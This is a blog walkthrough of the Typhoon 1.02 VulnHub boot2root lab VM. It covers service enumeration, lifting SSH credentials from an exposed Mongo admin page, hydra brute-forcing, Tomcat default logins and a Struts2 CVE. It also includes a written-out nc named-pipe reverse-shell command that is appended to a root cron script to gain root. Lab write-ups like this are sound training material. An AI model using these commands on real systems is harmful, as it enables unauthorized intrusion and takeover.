This post documents the complete walkthrough of Typhoon: 1.02, a boot2root [VM][1] created by [PRISMA CSI][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.

### Background

Typhoon VM contains several vulnerabilities and configuration errors. Typhoon can be used to test vulnerabilities in network services, configuration errors, vulnerable web applications, password cracking attacks, privilege escalation attacks, post exploitation steps, information gathering and DNS attacks.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129

Whoa. They are not lying when they say Typhoon is a vulnerable VM. Will you look at the MongoDB enumeration??!!

### Low-privilege Shell

As the saying "all roads lead to Rome" goes, there are a couple of ways to get a low-privilege shell. I'll take the path of least resistance.

From the `nmap` scan above, you can see that there's one disallowed entry in `robots.txt`—`/mongoadmin`.

<a class="image-popup">
![1bd00a91.png](/assets/images/posts/typhoon-1.02-walkthrough/1bd00a91.png)
</a>

Moving on to that directory, you'll see a web interface for administering the exposed Mongo instance at `27017/tcp`.

It's a no-brainer actually. A few clicks later, you'll see the credentials of a SSH account.

<a class="image-popup">
![ba812f0e.png](/assets/images/posts/typhoon-1.02-walkthrough/ba812f0e.png)
</a>

With that, we can proceed to get our low-privilege shell.

<a class="image-popup">
![07e84b8e.png](/assets/images/posts/typhoon-1.02-walkthrough/07e84b8e.png)
</a>

Boom. I'm in.

If you prefer the longer route, you can also try out the following steps:

+ Brute-force SSH with `hydra` + `rockyou`:
  1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt -t4 ssh://192.168.30.129`
  2. The password is `metallica` :metal:

+ Tomcat's manager webapp at `8080/tcp`:
  1. Location is `/manager/html`
  2. Username: `tomcat`, Password: `tomcat`
  3. Deploy a malicious webapp described [here](https://hackso.me/digitalworld.local-mercy-walkthrough/#tomcat-revisit)

+ Struts2 Showcase:
  1. There's a remote code execution vulnerability with Struts2 Showcase as per [CVE-2017-9791](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9791)
  2. The vulnerability is with the Struts1 integration at `/integration/editGangster`
  3. I wrote about how to exploit it [here](https://hackso.me/wintermute-1-walkthrough/#struts2-showcase-remote-command-execution)

### Privilege Escalation

Once you have obtained a low-privilege shell, the next step is to escalate privilege to `root`. Again, I'll take the path of least resistance.

During your enumeration, you'll notice a strange-looking script at `/tab/script.sh`.

<a class="image-popup">
![bb69e867.png](/assets/images/posts/typhoon-1.02-walkthrough/bb69e867.png)
</a>

If I've to guess, I'd say the script is ran as a `cron` job by `root`. That's our ticket to a `root` shell. We can probably use `nc` to send a reverse shell back to us. However, the `nc` on the machine doesn't have `-e` option.

No problem. We can still do something like this.

On one hand, open a `nc` listener at your attacking machine. On the other hand, append the following command to `/tab/script.sh`:

`echo 'rm -rf /tmp/p; mknod /tmp/p p; /bin/bash 0</tmp/p | nc 192.168.30.128 1234 >/tmp/p' >> /tab/script.sh`

You'll see the `root` shell in a bit at the `nc` listener like so.

<a class="image-popup">
![f7cd10a3.png](/assets/images/posts/typhoon-1.02-walkthrough/f7cd10a3.png)
</a>

Again, there are other ways to get `root`:

+ `admin` can sudo as `root` with `sudo -s`
+ Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation as per EDB-ID [37292](https://www.exploit-db.com/exploits/37292)

### Root Flag

The last step is to get the `root` flag as proof that you have `root`ed the machine.

### Afterthought

I’m sure this is not exhaustive. Kudos to [PRISMA CSI][2] for creating this VM. No better way to learn than hands-on practice.
